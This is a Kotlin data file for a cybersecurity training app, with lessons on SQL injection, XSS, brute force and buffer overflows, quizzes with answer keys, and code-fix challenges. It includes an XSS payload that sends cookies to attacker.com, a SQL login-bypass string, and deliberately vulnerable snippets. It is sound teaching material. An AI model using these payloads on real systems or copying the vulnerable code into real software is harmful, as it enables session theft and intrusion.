package com.example

// UI Models representing cybersecurity training content
data class AcademyLesson(
    val id: String,
    val category: String,
    val title: String,
    val summary: String,
    val content: String,
    val realWorldBreach: String, // Real world case study (e.g. Equifax for broken access)
    val difficulty: String, // "Beginner", "Intermediate", "Advanced"
    val durationMin: Int
)

data class QuizQuestion(
    val id: String,
    val category: String,
    val questionText: String,
    val options: List<String>,
    val correctIndex: Int,
    val explanation: String
)

data class CodeSnippetChallenge(
    val id: String,
    val title: String,
    val language: String,
    val description: String,
    val vulnerableCode: String,
    val secureCode: String,
    val flawExplanation: String,
    val optionsToFix: List<String>,
    val correctFixIndex: Int
)

object CybersecurityData {
    val lessons = listOf(
        AcademyLesson(
            id = "sqli",
            category = "Injection Attacks",
            title = "SQL Injection (SQLi) Deep Dive",
            summary = "Learn how unsanitized database queries let attackers hijack backend servers.",
            content = """
                ### What is SQL Injection?
                SQL Injection (SQLi) is a critical vulnerability where an attacker inserts malicious SQL commands into input fields. Because the inputs are concatenated directly into SQL queries without proper sanitization/parameterization, the database interpreter parses and executes them as valid code.
                
                ### How it works:
                Consider a typical login query:
                `SELECT * FROM users WHERE user = 'USER_INPUT' AND pass = 'PASS_INPUT'`
                
                If an attacker enters `' OR 1=1 --` into the username field, the compiled database command becomes:
                `SELECT * FROM users WHERE user = '' OR 1=1 --' AND pass = 'PASS_INPUT'`
                
                The SQL engine evaluates `1=1` as TRUE. The double-dash (`--`) comments out the remainder of the query, bypassing the password check entirely and logging the attacker in as the first user (often the administrator).
                
                ### Mitigations:
                1. **Prepared Statements & Parameterized Queries (MANDATORY)**: This treats inputs strictly as safe data parameters, never executable instructions.
                2. **Input Validation**: Allowlist alpha-numeric characters only.
                3. **Stored Procedures**: Ensure security policies map bounds clearly.
            """.trimIndent(),
            realWorldBreach = "TalkTalk Hack (2015): Attackers exploited a simple un-parameterized SQL injection on standard web pages, stealing the sensitive personal and financial details of over 150,000 customers.",
            difficulty = "Beginner",
            durationMin = 10
        ),
        AcademyLesson(
            id = "xss",
            category = "Web Application Security",
            title = "Cross-Site Scripting (XSS)",
            summary = "Inject malicious scripts into trusted websites to hijack active user sessions.",
            content = """
                ### What is Cross-Site Scripting?
                XSS occurs when application software includes untrusted input in a web page without proper escaping or sanitization. The attacker targets the client (the browser) by executing arbitrary JavaScript on the user's side.
                
                ### Main Types of XSS:
                1. **Stored XSS**: Malicious scripts are permanently saved on server-side databases (e.g., in user comments or forum feeds). Every time visitors request that page, the script executes.
                2. **Reflected XSS**: The malicious script is reflected off a web application onto the user's web browser, usually embedded within an untrusted link.
                3. **DOM-based XSS**: The exploit runs entirely inside client-side JS by modifying the DOM tree environment.
                
                ### How it works:
                An attacker posts a forum comment containing:
                `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`
                
                When another user visits the page, the user's browser runs the script, sending their private session cookie directly to the attacker.
                
                ### Mitigations:
                1. **Context-Aware HTML Entity Encoding**: Convert characters like `<` to `&lt;` and `>` to `&gt;`.
                2. **Content Security Policy (CSP)**: Establish strict browser header instructions limiting execution sources.
                3. **HttpOnly Cookies**: Block JavaScript components from reading session tokens.
            """.trimIndent(),
            realWorldBreach = "Samy Worm (MySpace, 2005): A stored XSS payload written in Javascript infected over 1 million user profiles within 20 hours, converting MySpace into one of the fastest spreading scripts in history.",
            difficulty = "Intermediate",
            durationMin = 12
        ),
        AcademyLesson(
            id = "rate_limit",
            category = "Network & API Security",
            title = "Brute Force & Rate Limiting",
            summary = "Protect authentication gateways from robotic credential stuffing attacks.",
            content = """
                ### What is Brute-Force & Credential Stuffing?
                Brute forcing is an automated attack where a script systematically attempts millions of combinations to guess user credentials or API tokens. In credential stuffing, lists of compromised username/password pairs are fed automatedly into login panels.
                
                ### Why standard networks fail:
                Without restriction, modern botnets can execute thousands of queries per minute against standard HTTP authentication portals. This stresses servers (causing denial of service) and ultimately succeeds on accounts with weak passwords.
                
                ### Mitigations:
                1. **Rate Limiting**: Limit transactions per client IP (e.g., max 5 login requests per minute). Return `HTTP 429 Too Many Requests`.
                2. **Account Lockouts**: Temporarily lock accounts after 3-5 consecutive failed attempts. (Beware: this can be abused for denial of service. Implement with captchas/remit keys instead).
                3. **CAPTCHA/Honeypots**: Challenge robotic behaviors with human puzzles.
            """.trimIndent(),
            realWorldBreach = "Uber Credential Stuffing (2022): Automated attacker scripts breached multiple contractor accounts via persistent, low-and-slow authentication attempts, leading to internal systems access.",
            difficulty = "Beginner",
            durationMin = 8
        ),
        AcademyLesson(
            id = "buffer_overflow",
            category = "Memory Corruptions",
            title = "Buffer Overflow Vulnerabilities",
            summary = "Exceed bound capacities to rewrite CPU registers and execute system code.",
            content = """
                ### What is a Buffer Overflow?
                In systems programming (C/C++), variables are written into exact, sequential blocks of memory. A Buffer Overflow occurs when a program writes more data to a buffer than it was allocated to hold. The adjacent registers on the stack are overwritten.
                
                ### Memory layout instruction:
                When a function is called, the stack contains:
                - Local variables (buffer)
                - Saved Frame Pointer
                - Instruction Return Address (EIP/RIP) - *Points to the next code block to execute.*
                
                By parsing an input larger than the buffer size, an attacker can overwrite the 'Return Address' register, pointing it to their malicious code (shellcode) loaded in memory.
                
                ### Mitigations:
                1. **Safe Library Substitutions**: Refuse standard C calls like `strcpy`, `sprintf`, `gets` for safer bound-checking equivalents like `strncpy`, `snprintf`, `fgets`.
                2. **Modern Languages**: Use languages with automatic bounds checking and safe memory managers (Kotlin, Java, Rust).
                3. **OS-Level Guards**: ASLR (Address Space Layout Randomization) and DEP (Data Execution Prevention / NX bit).
            """.trimIndent(),
            realWorldBreach = "Morris Worm (1988): Used a buffer overflow vulnerability in Unix 'fingerd' daemon's gets() routine. It became the first widespread self-replicating worm, jamming 10% of ARPANET internet servers.",
            difficulty = "Advanced",
            durationMin = 15
        )
    )

    val quizzes = listOf(
        QuizQuestion(
            id = "q1",
            category = "Fundamentals",
            questionText = "What is the primary difference between a White Hat and a Black Hat hacker?",
            options = listOf(
                "White Hats only program in Python; Black Hats use binary.",
                "White Hats hack with authorized scanning and written consent; Black Hats exploit systems maliciously without permission.",
                "White Hats work for governmental agencies; Black Hats target corporate offices.",
                "There is no legal difference; both actions violate state laws."
            ),
            correctIndex = 1,
            explanation = "White Hat hackers are authorized security experts working cleanly under explicit written consent, adhering to standard scoping rules. Black Hats act without authorization for malicious gain or disruption."
        ),
        QuizQuestion(
            id = "q2",
            category = "Web Security",
            questionText = "Which mitigation is the absolute best defense against SQL Injection payloads?",
            options = listOf(
                "Stripping all apostrophes (') using regex strings.",
                "Encrypting the database passwords with MD5 hashing.",
                "Implementing Parameterized Queries (Prepared Statements) to separate input data from code instruction.",
                "Restricting the login form input fields to 15 characters max."
            ),
            correctIndex = 2,
            explanation = "Parameterized queries isolate the interpreter from input fields, ensuring data remains parsed strictly as values, neutralizing any database executable statement."
        ),
        QuizQuestion(
            id = "q3",
            category = "Network Security",
            questionText = "What represents a 'SYN Flood' attack?",
            options = listOf(
                "A physical flood affecting servers.",
                "Flooding TCP handshakes by initiating connections with SYN requests but never responding to the returned SYN-ACK, exhausting system port resources.",
                "Simultaneously executing millions of ping commands.",
                "Intercepting wireless packets in airports."
            ),
            correctIndex = 1,
            explanation = "A SYN Flood is a denial of service attack where an attacker leaves TCP handshake requests half-open, exhausting the target server's connection port memory."
        ),
        QuizQuestion(
            id = "q4",
            category = "Cryptography",
            questionText = "Why should we add a unique, random string ('Salt') before hashing a password?",
            options = listOf(
                "To compress the password length.",
                "To speed up database verification lookups.",
                "To defend against pre-computed decryption hash lists (Rainbow Tables).",
                "To ensure the password complies with federal standards."
            ),
            correctIndex = 2,
            explanation = "Hashing standard input words always yields the exact same cipher. Adding salt ensures identical passwords yield completely distinct ciphers, defeating pre-loaded lookup lists (Rainbow tables)."
        ),
        QuizQuestion(
            id = "q5",
            category = "Memory Security",
            questionText = "Which low-level C function contains a serious buffer vulnerability because it enforces no bounds limits?",
            options = listOf(
                "strcpy()",
                "strncpy()",
                "snprintf()",
                "fgets()"
            ),
            correctIndex = 0,
            explanation = "Standard `strcpy` copies strings until it encounters a null character, making it highly vulnerable to exceeding stack buffer counts, whereas `strncpy` restricts limits with bounds constraints."
        )
    )

    val codeChallenges = listOf(
        CodeSnippetChallenge(
            id = "sc1",
            title = "Sanitize SQL Lookup",
            language = "Java/JDBC",
            description = "Identify and safe-guard this vulnerable SQL lookup script checking database users.",
            vulnerableCode = """
public User checkUser(String customInput) {
    String sql = "SELECT * FROM tbl_users WHERE id = '" + customInput + "'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(sql);
    // ... parse user ...
}
            """.trimIndent(),
            secureCode = """
public User checkUser(String customInput) {
    String sql = "SELECT * FROM tbl_users WHERE id = ?";
    PreparedStatement pstmt = connection.prepareStatement(sql);
    pstmt.setString(1, customInput);
    ResultSet rs = pstmt.executeQuery();
    // ... parse user ...
}
            """.trimIndent(),
            flawExplanation = "String concatenation constructs SQL code directly from input. An attacker could supply '12 OR 1=1' to bypass identifiers entirely. PreparedStatements bind inputs securely as params.",
            optionsToFix = listOf(
                "Parse query using 'statement.addBatch()'.",
                "Substitute plain Statement with PreparedStatement and parameter placeholders (?).",
                "Convert customInput into base64 format.",
                "Run standard string replace on double quotes."
            ),
            correctFixIndex = 1
        ),
        CodeSnippetChallenge(
            id = "sc2",
            title = "Secure Web Echo",
            language = "HTML/JavaScript",
            description = "Echoing query parameters straight to DOM can trigger Cross-Site Scripting. Fix it.",
            vulnerableCode = """
// Reading user query string from URL
const params = new URLSearchParams(window.location.search);
const username = params.get("user");
// Vulnerable assignment running raw HTML scripts
document.getElementById("greeting").innerHTML = "Hello, " + username;
            """.trimIndent(),
            secureCode = """
// Reading user query string from URL
const params = new URLSearchParams(window.location.search);
const username = params.get("user");
// Secure assignment encoding entities in DOM textContent
document.getElementById("greeting").textContent = "Hello, " + username;
            """.trimIndent(),
            flawExplanation = "Setting innerHTML parses HTML tags directly inside input strings. If the URL contains script tags, they trigger execution. Assigning textContent forces the browser to treat input strictly as plain text.",
            optionsToFix = listOf(
                "Split strings and check length.",
                "Use innerText instead of innerHTML / Encode inputs as clean plain text via textContent.",
                "Encrypt parameters with symmetric AES keys.",
                "Add an iframe tag sandbox container."
            ),
            correctFixIndex = 1
        )
    )
}
